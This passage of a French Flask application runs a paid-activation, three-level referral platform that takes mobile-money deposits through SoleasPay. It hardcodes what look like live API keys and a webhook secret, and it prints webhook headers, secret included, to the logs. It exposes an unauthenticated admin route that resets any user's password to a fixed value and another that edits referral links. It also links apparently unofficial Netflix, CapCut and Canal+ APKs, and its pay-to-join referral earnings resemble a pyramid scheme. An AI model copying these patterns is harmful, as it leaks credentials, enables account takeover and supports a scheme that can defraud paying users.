            return render_template('reset_request.html')

        # ✅ OK → autoriser reset
        session['reset_email'] = email
        flash("Vérification réussie. Vous pouvez changer votre mot de passe.", "success")
        return redirect(url_for('new_password_page'))

    return render_template('reset_request.html')

from datetime import datetime

from datetime import datetime, timezone

# --- FONCTION UNIQUE DE LOCALISATION ---
def enregistrer_position(user_obj):
    """
    Récupère les coordonnées GPS du formulaire et les stocke dans l'objet user.
    """
    lat = request.form.get('latitude')
    lng = request.form.get('longitude')
    
    if lat and lng:
        user_obj.latitude = lat
        user_obj.longitude = lng
        # On peut aussi mettre à jour la date de dernière localisation si la colonne existe
        if hasattr(user_obj, 'last_location_update'):
            user_obj.last_location_update = datetime.now(timezone.utc)
        return True
    return False

@app.route("/connexion", methods=["GET", "POST"])
def connexion_page():
    if request.method == "POST":
        username = request.form.get("username", "").strip().lower()
        password = request.form.get("password", "").strip()

        if not username or not password:
            flash("Veuillez remplir tous les champs.", "danger")
            return redirect(url_for("connexion_page"))

        user = User.query.filter_by(username=username).first()

        if not user or not check_password_hash(user.password, password):
            flash("Identifiants incorrects.", "danger")
            return redirect(url_for("connexion_page"))

        if getattr(user, "is_banned", False):
            flash("Votre compte a été suspendu. Contactez le support.", "danger")
            return redirect(url_for("connexion_page"))

        remember_me = request.form.get("remember_me") == "1"
        session.clear()
        session["user_id"] = user.id
        session["username"] = user.username
        session.permanent = remember_me

        flash(f"Connexion réussie ! Bienvenue {user.username}.", "success")
        return redirect(url_for("dashboard_page"))

    return render_template("connexion.html")

@app.route("/admin/reseau/leaderbrice")
@login_required
def reseau_leader_brice():
    # 1. On cherche le leader par son username "leaderbrice01"
    leader = User.query.filter_by(username="leaderbrice01").first()
    
    if not leader:
        return "L'utilisateur 'leaderbrice01' n'existe pas dans la base de données.", 404

    # --- NIVEAU 1 : Filleuls directs ---
    # On utilise ta relation 'downlines' définie dans ton modèle
    niveau1 = leader.downlines.all()

    # --- NIVEAU 2 : Filleuls des filleuls ---
    niveau2 = []
    if niveau1:
        # On récupère tous les usernames du niveau 1
        usernames_n1 = [u.username for u in niveau1 if u.username]
        if usernames_n1:
            # On cherche tous les utilisateurs dont le parrain est dans le niveau 1
            niveau2 = User.query.filter(User.parrain.in_(usernames_n1)).all()

    # --- NIVEAU 3 : Filleuls du niveau 2 ---
    niveau3 = []
    if niveau2:
        # On récupère tous les usernames du niveau 2
        usernames_n2 = [u.username for u in niveau2 if u.username]
        if usernames_n2:
            # On cherche tous les utilisateurs dont le parrain est dans le niveau 2
            niveau3 = User.query.filter(User.parrain.in_(usernames_n2)).all()

    # Calcul des statistiques exactes pour l'affichage
    stats = {
        "total_filleuls": len(niveau1) + len(niveau2) + len(niveau3),
        "total_n1": len(niveau1),
        "total_n2": len(niveau2),
        "total_n3": len(niveau3)
    }

    return render_template(
        "admin_reseau.html",
        leader=leader,
        niveau1=niveau1,
        niveau2=niveau2,
        niveau3=niveau3,
        stats=stats
    )


@app.route("/inscription", methods=["GET", "POST"])
def inscription_page():
    date_ouverture = datetime(2026, 8, 1, 12, 0, 0)
    if datetime.now() < date_ouverture:
        return render_template("maintenance_inscription.html")

    ref_code = request.args.get("ref", "").strip().lower()
    session.pop("username_exists", None)

    if request.method == "POST":
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if user_ip and ',' in user_ip:
            user_ip = user_ip.split(',')[0].strip()

        username = request.form.get("username", "").strip().lower()
        email = request.form.get("email", "").strip()
        country = request.form.get("country", "").strip()
        phone = request.form.get("phone", "").strip()
        password = request.form.get("password", "").strip()
        confirm = request.form.get("confirm_password", "").strip()
        parrain_code = (request.form.get("parrain", "") or ref_code).strip().lower()

        errors = []

        if not all([username, email, country, phone, password, confirm]):
            errors.append("Tous les champs sont obligatoires.")

        if username and not re.fullmatch(r"[a-z0-9]+", username):
            errors.append("Nom d'utilisateur invalide.")

        if password != confirm:
            errors.append("Les mots de passe ne correspondent pas.")

        existing_users = User.query.filter(
            (User.username == username) |
            (User.email == email) |
            (User.phone == phone)
        ).all()

        for u in existing_users:
            if u.username == username:
                errors.append(f"Nom d'utilisateur '{username}' existe déjà.")
                session["username_exists"] = True
            if u.email == email:
                errors.append("Cet email est déjà utilisé.")
            if u.phone == phone:
                errors.append("Ce numéro est déjà enregistré.")

        parrain_user = None
        if parrain_code:
            parrain_user = User.query.filter_by(username=parrain_code).first()
            if not parrain_user:
                errors.append("Code parrain invalide.")

        if errors:
            for error in errors:
                flash(error, "danger")
            return render_template("inscription.html", code_ref=ref_code)

        try:
            new_user = User(
                uid=str(uuid.uuid4()),
                username=username,
                email=email,
                phone=phone,
                country=country,
                password=generate_password_hash(password),
                parrain=parrain_user.username if parrain_user else None,
                ip_address=user_ip,
                solde_total=0,
                solde_depot=0,
                solde_revenu=0,
                solde_parrainage=0,
                date_creation=datetime.now(timezone.utc)
            )

            # --- POSITION SUPPRIMÉE ICI ---
            db.session.add(new_user)
            db.session.commit()

            session["user_id"] = new_user.id

            flash("Compte créé avec succès 🎉", "success")
            return redirect(url_for("dashboard_bloque"))

        except Exception as e:
            db.session.rollback()
            flash("Erreur création compte : " + str(e), "danger")

    return render_template("inscription.html", code_ref=ref_code)



from datetime import datetime
from flask import render_template

def verification_lancement():
    # Date cible : 11 Avril 2026 à 12h00
    date_lancement = datetime(2026, 8, 1, 12, 0, 0)
    if datetime.now() < date_lancement:
        # On renvoie directement le template de maintenance
        return render_template("maintenance_inscription.html")
    return None


PUBLIC_API_KEY = "SP_y7QKkaamPsVTlw8GDDGyzlJ7bmPUvdLorOQqWUXfRLI_AP"
PRIVATE_SECRET_KEY = "SP_-YQFuI5M9B1H2bNSNycwI_YQBc_kXkGACp-mLoBdWqI"

def obtenir_token():
    url = "https://soleaspay.com/api/action/auth"

    payload = {
        "public_apikey": PUBLIC_API_KEY,
        "private_secretkey": PRIVATE_SECRET_KEY
    }

    headers = {
        "Content-Type": "application/json"
    }

    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        data = response.json()

        token = data.get("access_token")   # ✅ CORRECTION ICI

        if not token:
            return None, data

        return token, None

    except Exception as e:
        return None, str(e)

from datetime import datetime, timedelta


@app.route("/admin/fix_parrain")
def fix_parrain():
    ancien = "aaaa"
    nouveau = "amen"

    users = User.query.filter_by(parrain=ancien).all()
    for u in users:
        u.parrain = nouveau

    db.session.commit()
    return "Parrain mis à jour avec succès"


@app.route("/admin/reset_password/<username>")
def reset_password(username):
    user = User.query.filter_by(username=username).first()

    if not user:
        return "Utilisateur introuvable"

    from werkzeug.security import generate_password_hash

    nouveau_mdp = "ingrd123"
    user.password = generate_password_hash(nouveau_mdp)

    db.session.commit()

    return f"Mot de passe réinitialisé pour {username} : {nouveau_mdp}"

SOLEAS_API_KEY = "SP_y7QKkaamPsVTlw8GDDGyzlJ7bmPUvdLorOQqWUXfRLI_AP"
SOLEAS_WEBHOOK_SECRET = "b42ed39b9e0db71db4556a2dfe1b1ad00dcce656fd4dba033f1947f913f1908bc817588c2edb32d92533a1d162e57ad4b1f7299f39695c5671c3ef07baa6f22a"

# Mapping des noms de pays vers les codes utilisés dans SERVICES
# Inclut les formes originales + normalisées (sans accents, minuscules) pour compatibilité
COUNTRY_CODE = {
    # Cameroun
    "Cameroun": "CM", "Cameroon": "CM", "cameroun": "CM", "cameroon": "CM",
    "cm": "CM", "CM": "CM",
    # Côte d'Ivoire
    "Côte d'Ivoire": "CI", "Cote d'Ivoire": "CI", "côte d'ivoire": "CI",
    "cote d'ivoire": "CI", "cote divoire": "CI", "côte divoire": "CI",
    "ivory coast": "CI", "Ivory Coast": "CI",
    "ci": "CI", "CI": "CI",
    # Burkina Faso
    "Burkina Faso": "BF", "burkina faso": "BF", "burkina": "BF",
    "bf": "BF", "BF": "BF",
    # Bénin
    "Bénin": "BJ", "Benin": "BJ", "bénin": "BJ", "benin": "BJ",
    "bj": "BJ", "BJ": "BJ",
    # Togo
    "Togo": "TG", "togo": "TG",
    "tg": "TG", "TG": "TG",
    # Congo DRC
    "Congo DRC": "COD", "Congo": "COD", "congo drc": "COD", "congo": "COD",
    "rdc": "COD", "RDC": "COD", "République Démocratique du Congo": "COD",
    "republique democratique du congo": "COD",
    "cod": "COD", "COD": "COD",
    # Congo Brazzaville
    "Congo Brazzaville": "COG", "congo brazzaville": "COG",
    "cog": "COG", "COG": "COG",
    # Gabon
    "Gabon": "GAB", "gabon": "GAB",
    "gab": "GAB", "GAB": "GAB",
    # Uganda
    "Uganda": "UGA", "uganda": "UGA",
    "uga": "UGA", "UGA": "UGA",
}

SERVICES = {

    # 🇨🇲 CAMEROUN
    "CM": [
        {"id": 1, "name": "MOMO CM", "description": "MTN MOBILE MONEY CAMEROUN"},
        {"id": 2, "name": "OM CM", "description": "ORANGE MONEY CAMEROUN"},
    ],

    # 🇨🇮 CÔTE D’IVOIRE
    "CI": [
        {"id": 29, "name": "OM CI", "description": "ORANGE MONEY COTE D'IVOIRE"},
        {"id": 30, "name": "MOMO CI", "description": "MTN MONEY COTE D'IVOIRE"},
        {"id": 31, "name": "MOOV CI", "description": "MOOV COTE D'IVOIRE"},
        {"id": 32, "name": "WAVE CI", "description": "WAVE COTE D'IVOIRE"},
    ],

    # 🇧🇫 BURKINA FASO
    "BF": [
        {"id": 33, "name": "MOOV BF", "description": "MOOV BURKINA FASO"},
        {"id": 34, "name": "OM BF", "description": "ORANGE MONEY BURKINA FASO"},
    ],

    # 🇧🇯 BENIN
    "BJ": [
        {"id": 35, "name": "MOMO BJ", "description": "MTN MONEY BENIN"},
        {"id": 36, "name": "MOOV BJ", "description": "MOOV BENIN"},
    ],

    # 🇹🇬 TOGO
    "TG": [
        {"id": 37, "name": "T-MONEY TG", "description": "T-MONEY TOGO"},
        {"id": 38, "name": "MOOV TG", "description": "MOOV TOGO"},
    ],

    # 🇨🇩 CONGO DRC
    "COD": [
        {"id": 52, "name": "VODACOM COD", "description": "VODACOM CONGO DRC"},
        {"id": 53, "name": "AIRTEL COD", "description": "AIRTEL CONGO DRC"},
        {"id": 54, "name": "ORANGE COD", "description": "ORANGE CONGO DRC"},
    ],

    # 🇨🇬 CONGO BRAZZAVILLE
    "COG": [
        {"id": 55, "name": "AIRTEL COG", "description": "AIRTEL CONGO"},
        {"id": 56, "name": "MOMO COG", "description": "MTN MOMO CONGO"},
    ],

    # 🇬🇦 GABON
    "GAB": [
        {"id": 57, "name": "AIRTEL GAB", "description": "AIRTEL GABON"},
    ],

    # 🇺🇬 UGANDA
    "UGA": [
        {"id": 58, "name": "AIRTEL UGA", "description": "AIRTEL UGANDA"},
        {"id": 59, "name": "MOMO UGA", "description": "MTN MOMO UGANDA"},
    ],
}



@app.route("/logout")
def logout_page():
    session.clear()
    flash("Déconnexion effectuée.", "info")
    return redirect(url_for("connexion_page"))


def get_global_stats():
    total_users = db.session.query(func.count(User.id)).scalar() or 0
    total_deposits = db.session.query(func.sum(Depot.montant)).filter(Depot.statut=="valide").scalar() or 0
    total_withdrawn = db.session.query(func.sum(User.total_retrait)).scalar() or 0  # ← On utilise maintenant total_retrait
    return total_users, total_deposits, total_withdrawn


# --------------------------------------
# 1️⃣ Page dashboard_bloque (initiation paiement)
# --------------------------------------
@app.route("/dashboard_bloque", methods=["GET", "POST"])
def dashboard_bloque():
    import logging

    user = get_logged_in_user()
    if not user:
        flash("Veuillez vous connecter.", "danger")
        return redirect(url_for("connexion_page"))

    if user_is_activated(user):
        return redirect(url_for("dashboard_page"))

    pending_depot = None
    user_has_pending_depot = bool(pending_depot)

    user_country = (user.country or "").strip()
    country_code = COUNTRY_CODE.get(user_country) if user_country else None
    if not country_code:
        flash("Pays non supporté.", "danger")
        return redirect(url_for("connexion_page"))

    if request.method == "POST":

        operator_name = request.form.get("operator")
        amount = request.form.get("montant", type=int)
        fullname = request.form.get("fullname")
        phone = request.form.get("phone", "").strip()

        if not operator_name or not amount or not fullname or not phone:
            flash("Tous les champs sont requis.", "danger")
            return redirect(url_for("dashboard_bloque"))

        if amount != 4500:
            flash("Le montant d'activation est exactement 4500 FCFA.", "danger")
            return redirect(url_for("dashboard_bloque"))

        phone = phone.replace(" ", "").replace("-", "")

        if not phone.isdigit() or len(phone) < 8:
            flash("Numéro de paiement invalide.", "danger")
            return redirect(url_for("dashboard_bloque"))

        service = next(
            (s for s in SERVICES[country_code] if s["name"] == operator_name),
            None
        )

        if not service:
            flash("Opérateur non supporté.", "danger")
            return redirect(url_for("dashboard_bloque"))

        # Création du dépôt
        new_depot = Depot(
            user_id=user.id,
            user_name=user.username,
            phone=phone,
            operator=operator_name,
            country=country_code,
            montant=amount,
            statut="pending",
            email=user.email
        )

        db.session.add(new_depot)
        db.session.commit()

        logging.info(f"DEPOT CREE : id={new_depot.id} user_id={new_depot.user_id}")

        payload = {
            "wallet": phone,
            "amount": amount,
            "currency": "XOF",
            "order_id": f"E-{new_depot.id}",
            "description": f"Activation {user.username}",
            "payer": fullname,
            "payerEmail": user.email,
            "successUrl": "https://nectarpro.cc/dashboard/pay/ok",
            "failureUrl": "https://nectarpro.cc/dashboard_bloque"
        }

        headers = {
            "x-api-key": SOLEAS_API_KEY,
            "operation": "2",
            "service": str(service["id"]),
            "Content-Type": "application/json"
        }

        try:
            response = requests.post(
                "https://soleaspay.com/api/agent/bills/v3",
                headers=headers,
                json=payload,
                timeout=30
            )

            result = response.json()

            logging.info(f"SOLEASPAY RESPONSE : {result}")

        except Exception as e:
            logging.exception(e)
            flash("Impossible de contacter SoleasPay.", "danger")
            return redirect(url_for("dashboard_bloque"))

        # Vérification de la réponse
        if not result.get("success", False):
            flash(result.get("message", "Erreur de paiement"), "danger")
            return redirect(url_for("dashboard_bloque"))

        # Sauvegarde de la référence SoleasPay si disponible
        data = result.get("data", {})

        if data.get("reference"):
            new_depot.reference = data.get("reference")
            db.session.commit()

        flash("Veuillez confirmer le paiement sur votre téléphone.", "info")
        return redirect(url_for("dashboard_bloque"))

    return render_template(
        "dashboard_bloque.html",
        user=user,
        user_has_pending_depot=user_has_pending_depot,
        services_by_country=SERVICES,
        country_code=country_code
    )

from urllib.parse import urlencode

@app.route("/api/webhook/soleaspay", methods=["POST"])
def webhook_soleaspay():

    import logging
    from datetime import datetime

    data = request.get_json(silent=True)

    print("=" * 50)
    print("WEBHOOK RECU")
    print("HEADERS:", dict(request.headers))
    print("JSON:", data)
    print("=" * 50)

    if not data:
        return jsonify({"error": "Invalid JSON"}), 400

    # 🔒 Sécurité
    received_key = request.headers.get("x-private-key")
    if not received_key or received_key != SOLEAS_WEBHOOK_SECRET:
        return jsonify({"error": "Unauthorized"}), 403

    # ✅ Récupération correcte des données
    details = data.get("data") or {}

    operation = (
        details.get("operation")
        or data.get("operation")
        or ""
    ).upper()

    status = str(data.get("status", "")).upper()

    print("OPERATION :", operation)
    print("STATUS :", status)

    # ======================================================
    # 🔵 CAS DEPOT (PURCHASE)
    # ======================================================
    if operation == "PURCHASE":

        external_ref = (
            details.get("external_reference")
            or data.get("externalRef")
        )

        internal_ref = (
            details.get("reference")
            or data.get("internalRef")
            or data.get("reference")
        )

        print("DEPOT external_ref :", external_ref)
        print("DEPOT internal_ref :", internal_ref)

        if not external_ref or not external_ref.startswith("E-"):
            return jsonify({"error": "Invalid depot reference"}), 400

        try:
            depot_id = int(external_ref.split("-")[1])
        except Exception:
            return jsonify({"error": "Bad depot ID"}), 400

        depot = Depot.query.get(depot_id)

        if not depot:
            logging.error(f"DEPOT NOT FOUND : {external_ref}")
            return jsonify({"error": "Depot not found"}), 404

        print("DEPOT trouvé :", depot.id)
        print("USER ID :", depot.user_id)

        # Déjà traité
        if depot.statut == "success":
            return jsonify({"received": True}), 200

        if status in ["SUCCESS", "COMPLETED", "APPROVED"]:
            depot.statut = "success"

            if internal_ref:
                depot.reference = internal_ref

            user = db.session.get(User, depot.user_id)

            if user:
                user.premier_depot = True

        elif status in ["FAILED", "REJECTED"]:
            depot.statut = "failed"

        else:
            depot.statut = "pending"

        depot.last_sync = datetime.utcnow()

        db.session.commit()

        logging.info(f"DEPOT UPDATED : {depot.id} -> {depot.statut}")

        return jsonify({"received": True}), 200

    # ======================================================
    # 🟢 CAS RETRAIT (WITHDRAW)
    # ======================================================
    elif operation in ["WITHDRAW", "WITHDRAWAL"]:

        reference = (
            details.get("reference")
            or data.get("internalRef")
            or data.get("reference")
        )

        print("RETRAIT reference :", reference)

        if not reference:
            return jsonify({"error": "No reference"}), 400

        retrait = Retrait.query.filter_by(
            reference_soleaspay=reference
        ).first()

        if not retrait:
            logging.error(f"RETRAIT NOT FOUND : {reference}")
            return jsonify({"error": "Retrait not found"}), 404

        if retrait.statut in ["successful", "failed", "refused", "cancelled"]:
            return jsonify({"received": True}), 200

        if status in ["SUCCESS", "COMPLETED", "APPROVED"]:
            new_status = "successful"
        elif status == "FAILED":
            new_status = "failed"
        elif status == "REJECTED":
            new_status = "refused"
        elif status == "CANCELLED":
            new_status = "cancelled"
        else:
            new_status = "en_attente"

        old_status = retrait.statut

        print("RETRAIT trouvé :", retrait.id)
        print("Ancien statut :", old_status)
        print("Nouveau statut :", new_status)

        retrait.statut = new_status
        retrait.soleaspay_status = status
        retrait.last_sync = datetime.utcnow()

        if old_status != "successful" and new_status == "successful":
            user = db.session.get(User, retrait.user_id)

            if user:
                user.total_retrait = (user.total_retrait or 0) + retrait.montant

        db.session.commit()

        logging.info(f"RETRAIT UPDATED : {retrait.id} -> {new_status}")

        return jsonify({"received": True}), 200

    # ======================================================
    # ❌ CAS INCONNU
    # ======================================================
    print("Webhook ignoré - operation =", operation)
    return jsonify({"ignored": True}), 200

@app.route("/paiement/soleaspay/retour")
def bkapay_retour():
    status = request.args.get("status")

    # 🔐 Récupération de l'utilisateur connecté
    user = get_logged_in_user()  # Assure-toi que cette fonction retourne l'utilisateur connecté

    if status == "success":
        flash("Paiement reçu ! Votre compte sera activé automatiquement.", "success")


        db.session.commit()
        return redirect(url_for("dashboard_pay_ok"))

    # Paiement échoué ou annulé
    flash("Paiement échoué ou annulé.", "danger")
    return redirect(url_for("dashboard_bloque"))

@app.route("/dashboard/pay/ok", methods=["GET"])
def dashboard_pay_ok():
    user_id = session.get("user_id")
    if not user_id:
        flash("Vous devez vous connecter pour accéder au dashboard.", "danger")
        return redirect(url_for("connexion_page"))

    user = db.session.get(User, user_id)
    if not user:
        session.clear()
        flash("Session invalide, veuillez vous reconnecter.", "danger")
        return redirect(url_for("connexion_page"))

    # ✅ MARQUER DÉFINITIVEMENT L'ACCÈS PAY OK
    if not user.has_seen_pay_ok:
        user.has_seen_pay_ok = True
        db.session.commit()

    # 🔗 Lien de parrainage
    referral_code = user.username
    referral_link = url_for("inscription_page", _external=True) + f"?ref={referral_code}"

    # 📊 Stats globales
    total_users, total_deposits, total_withdrawn = get_global_stats()
    revenu_cumule = (user.solde_parrainage or 0) + (user.solde_revenu or 0)

    return render_template(
        "dashboard.html",
        user=user,
        points=user.points or 0,
        revenu_cumule=revenu_cumule,
        solde_parrainage=user.solde_parrainage or 0,
        solde_revenu=user.solde_revenu or 0,
        total_users=total_users,
        total_deposits=total_deposits,
        total_withdrawn=total_withdrawn,
        total_withdrawn_user=getattr(user, "total_retrait", 0),
        referral_code=referral_code,
        referral_link=referral_link
    )



@app.route("/api/check-activation")
def api_check_activation():
    user = get_logged_in_user()
    return {
        "activated": user_is_activated(user)
    }

@app.route("/chaine")
def whatsapp_channel():
    return render_template("chaine.html")

from datetime import datetime, timedelta

# Assure-toi que ces constantes sont définies en haut de ton app.py
MAX_GAIN = 500.0
CYCLE_DAYS = 3
WINDOW_HOURS = 24

@app.route("/dashboard")
def dashboard_page():
    user_id = session.get("user_id")
    if not user_id:
        flash("Vous devez vous connecter.", "danger")
        return redirect(url_for("connexion_page"))

    user = db.session.get(User, user_id)
    if not user:
        session.clear()
        return redirect(url_for("connexion_page"))

    # --- LOGIQUE DE PARRAINAGE ET STATS ---
    referral_code = user.username
    referral_link = url_for("inscription_page", _external=True) + f"?ref={referral_code}"

    if not user_is_activated(user) and not user.has_seen_pay_ok:
        return redirect(url_for("dashboard_bloque"))

    total_users, total_deposits, total_withdrawn = get_global_stats()
    revenu_cumule = (user.solde_parrainage or 0) + (user.solde_revenu or 0)

    # --- NOUVELLE LOGIQUE DE JEU (STRICTE) ---
    now = datetime.now()
    total_bonus = user.bonus or 0.0
    is_blocked_500 = total_bonus >= MAX_GAIN
    no_rounds_left = (user.remaining_rounds or 0) <= 0
    
    can_play = False
    next_date = None
    
    # Date de référence pour le cycle
    base_date = user.last_play_date or user.date_creation

    if base_date and not is_blocked_500 and not no_rounds_left:
        next_date = base_date + timedelta(days=CYCLE_DAYS)
        deadline_date = next_date + timedelta(hours=WINDOW_HOURS)

        if now < next_date:
            can_play = False
        elif next_date <= now <= deadline_date:
            can_play = True
        elif now > deadline_date:
            # Fenêtre ratée : On applique la pénalité immédiatement
            user.remaining_rounds -= 1
            user.last_play_date = next_date 
            db.session.commit()
            return redirect(url_for("dashboard_page"))

    # Cas spécial : Premier jeu après inscription
    if not user.last_play_date and not no_rounds_left and not is_blocked_500:
        can_play = True


    # --- PRODUITS DES VENDEURS (carousel dashboard) ---
    produits_recents = Produit.query.filter_by(est_actif=True).order_by(Produit.date_creation.desc()).limit(20).all()


    return render_template(
        "dashboard.html",
        user=user,
        points=user.points or 0,
        revenu_cumule=revenu_cumule,
        solde_parrainage=user.solde_parrainage or 0,
        solde_revenu=user.solde_revenu or 0,
        total_users=total_users,
        total_withdrawn_user=user.total_retrait or 0,
        total_deposits=total_deposits,
        referral_code=referral_code,
        referral_link=referral_link,
        total_withdrawn=total_withdrawn,

        # --- VARIABLES JEU ---
        can_play=can_play,
        next_date=next_date,
        rounds_left=user.remaining_rounds or 0,
        is_blocked_500=(is_blocked_500 or no_rounds_left),

        # --- PRODUITS VENDEURS ---
        produits_recents=produits_recents,

        # --- VARIABLES DASHBOARD PREMIUM ---
        now=now,
        total_filleuls=User.query.filter_by(parrain=user.username).count()
    )









if False:

        is_blocked_500=(is_blocked_500 or no_rounds_left)
        pass # fin if False

def user_is_activated(user):

    if not user:
        return False

    if user.premier_depot:
        return True

    return Depot.query.filter(
        (Depot.user_id == user.id) |
        (Depot.user_name == user.username),
        Depot.statut == "valide"
    ).first() is not None

# ===== Décorateur admin =====
def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not current_user.is_authenticated or not getattr(current_user, "is_admin", False):
            abort(403)
        return f(*args, **kwargs)
    return decorated

@app.route("/admin/users")
def admin_users():
    user = get_logged_in_admin()

    if not user:
        flash("Accès refusé.", "danger")
        return redirect(url_for("admin_finance"))

    users = User.query.order_by(User.date_creation.desc()).all()

    user_data = []
    for u in users:
        niveau1 = u.downlines.count()
        niveau2 = sum([child.downlines.count() for child in u.downlines])
        niveau3 = sum([sum([c.downlines.count() for c in child.downlines]) for child in u.downlines])

        user_data.append({
            "username": u.username,
            "email": u.email,
            "phone": u.phone,
            "parrain": u.parrain if u.parrain else "—",
            "niveau1": niveau1,
            "niveau2": niveau2,
            "niveau3": niveau3,
            "date_creation": u.date_creation,
            "premier_depot": u.premier_depot
        })

    return render_template("admin_users.html", user=user, users=user_data)

@app.route("/admin/users/inactifs")
def admin_users_inactifs():
    user = get_logged_in_admin()

    if not user:
        flash("Accès refusé.", "danger")
        return redirect(url_for("admin_finance"))

    inactifs = User.query.filter_by(premier_depot=False).order_by(User.date_creation.desc()).all()

    return render_template(
        "admin_users_inactifs.html",
        user=user,
        inactifs=inactifs,
        total_inactifs=len(inactifs)
    )

@app.route("/admin/users/actifs")
def admin_users_actifs():
    user = get_logged_in_admin()

    if not user:
        flash("Accès refusé.", "danger")
        return redirect(url_for("admin_finance"))

    actifs = User.query.filter_by(premier_depot=True).order_by(User.date_creation.desc()).all()

    return render_template(
        "admin_users_actifs.html",
        user=user,
        actifs=actifs,
        total_actifs=len(actifs)
    )

@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        # Vérifie l'utilisateur admin
        user = User.query.filter_by(username=username, is_admin=True).first()
        if user and check_password_hash(user.password, password):
            session["admin_id"] = user.id
            return redirect(url_for("admin_canal_edit"))
        else:
            flash("Nom d'utilisateur ou mot de passe incorrect.", "danger")
            return redirect(url_for("admin_login"))
    return render_template("admin_login.html")

@app.route("/admin/parrainage", methods=["GET", "POST"])
def admin_parrainage():
    if "admin_id" not in session:
        return redirect(url_for("admin_login"))

    users = User.query.order_by(User.username.asc()).all()

    if request.method == "POST":
        user_id = request.form.get("user_id")
        nouveau_username = (request.form.get("username") or "").strip().lower()
        nouveau_parrain = (request.form.get("parrain") or "").strip().lower()
        nouveau_phone = (request.form.get("phone") or "").strip()

        user = User.query.get(user_id)

        if not user:
            flash("Utilisateur introuvable.", "danger")
            return redirect(url_for("admin_parrainage"))

        # ✅ Modifier USERNAME
        if nouveau_username and nouveau_username != user.username:

            # Vérification format (lettres minuscules + chiffres seulement)
            if not nouveau_username.isalnum() or not nouveau_username.islower():
                flash("Le username doit contenir uniquement lettres minuscules et chiffres.", "danger")
                return redirect(url_for("admin_parrainage"))

            # Vérification unicité
            username_existe = User.query.filter(
                User.username == nouveau_username,
                User.id != user.id
            ).first()

            if username_existe:
                flash("Ce username est déjà utilisé.", "danger")
                return redirect(url_for("admin_parrainage"))

            ancien_username = user.username
            user.username = nouveau_username

            # 🔥 Mettre à jour tous ceux qui ont cet ancien username comme parrain
            filleuls = User.query.filter_by(parrain=ancien_username).all()
            for f in filleuls:
                f.parrain = nouveau_username

        # ✅ Modifier PHONE
        if nouveau_phone and nouveau_phone != user.phone:
            phone_existe = User.query.filter(
                User.phone == nouveau_phone,
                User.id != user.id
            ).first()

            if phone_existe:
                flash("Numéro déjà utilisé.", "danger")
                return redirect(url_for("admin_parrainage"))

            user.phone = nouveau_phone

        # ✅ Modifier PARRAIN
        if nouveau_parrain == "":
            user.parrain = None
        else:
            parrain_user = User.query.filter_by(username=nouveau_parrain).first()
            if not parrain_user:
                flash("Parrain invalide.", "danger")
                return redirect(url_for("admin_parrainage"))

            if nouveau_parrain == user.username:
                flash("Un utilisateur ne peut pas être son propre parrain.", "danger")
                return redirect(url_for("admin_parrainage"))

            user.parrain = nouveau_parrain

        db.session.commit()
        flash(f"✅ Mise à jour effectuée pour {user.username}.", "success")
        return redirect(url_for("admin_parrainage"))

    return render_template("admin_parrainage.html", users=users)

# ===== Helpers =====
def get_logged_in_user_phone():
    return session.get("phone")

import os
from flask import Flask, render_template, send_from_directory, flash, redirect, url_for

@app.route('/contact')
def contact_page():
    # Affiche la page HTML d'explication et de téléchargement
    return render_template('contact.html')

@app.route('/download/contact')
def download_contact():
    directory = os.path.join(app.root_path, 'static', 'files')
    filename = 'contacts.vcf'
    
    # Vérification que le fichier existe bien avant l'envoi
    if not os.path.exists(os.path.join(directory, filename)):
        flash("Le fichier de contacts VCF n'est pas encore disponible.", "error")
        return redirect(url_for('contact_page'))

    return send_from_directory(directory, filename, as_attachment=True)


from flask import send_from_directory



# Route pour la page About
@app.route("/about")
def about():
    return render_template("about.html")

@app.route("/politique")
def politique():
    return render_template("politique_v2.html")

def get_service_name(service_id):
    """
    Cherche le nom du service dans tous les pays pour un ID donné.
    """
    for country_services in SERVICES.values():
        for s in country_services:
            if s["id"] == service_id:
                return s["name"]
    return f"Service {service_id}"  # fallback si ID inconnu

@app.route("/mes-retraits")
def mes_retraits():
    user = get_logged_in_user()

    # CORRECTION : Filtrer par user_id au lieu du numéro de téléphone
    retraits = Retrait.query.filter_by(user_id=user.id).order_by(Retrait.date.desc()).all()

    # Ajouter le nom lisible pour chaque retrait
    for r in retraits:
        # On s'assure que service_name est bien défini pour le template
        r.service_name = get_service_name(r.payment_method)

    return render_template("mes_retraits.html", retraits=retraits, user=user)


from datetime import datetime

from datetime import date



@app.route("/whatsapp-number", methods=["POST"])
def whatsapp_number():
    user = User.query.get(session["user_id"])

    number = request.form.get("number").strip()

    if not number.startswith("+") or not number[1:].isdigit() or len(number) < 10:
        flash("Numéro invalide !", "error")
        return redirect("/dashboard")

    user.whatsapp_number = number
    db.session.commit()

    vcf_path = os.path.join("static", "files", "con.vcf")

    try:
        with open(vcf_path, "a", encoding="utf-8") as file:
            file.write(
                f"BEGIN:VCARD\n"
                f"VERSION:3.0\n"
                f"N:{user.username}\n"
                f"TEL:{number}\n"
                f"END:VCARD\n\n"
            )
    except Exception as e:
        print("Erreur VCF :", e)

    return redirect("/dashboard")

@app.route("/netflix-view")
def netflix_view_page():
    return render_template("netflix2.html")


@app.route("/apk")
def apk_page():
    """
    Retourne la liste des APK disponibles via liens Google Drive.
    """
    apk_files = [
        {
            "name": "Netflix",
            "filename": "Netflix.apk",
            "link": "https://drive.google.com/file/d/1afSa24_oVoTWRCgpO07Lbu4qjKMUhwLC/view?usp=drivesdk"
        },
        {
            "name": "Chat",
            "filename": "chat.apk",
            "link": "https://drive.google.com/file/d/1-4idwrgNxjNilpLzR8zHkdMroVo41g9b/view?usp=drivesdk"
        },
        {
            "name": "CapCut",
            "filename": "capcut.apk",
            "link": "https://drive.google.com/file/d/1hwEzqwQWV2FKnTg1u0QAWrPjjOEyZCyj/view?usp=drivesdk"
        }
    ]

    return render_template("apk.html", apk_files=apk_files)

@app.route("/apk-canal")
def apk_canal_page():
    # Lien de ton application
    canal_apk = {
        "name": "Canal+ Premium",
        "filename": "canal_plus_vavoo.apk",
        "link": "https://play.google.com/store/apps/details?id=net.vypn.app", # Lien direct vers le téléchargement
        "reference": "Vavoo.to"
    }
    return render_template("apk_canal.html", app=canal_apk)


@app.route("/ecom")
def ecom():
    return render_template("ecom.html")

@app.route("/nous")
def nous_page():
    return render_template("nous.html")

@app.route("/trade")
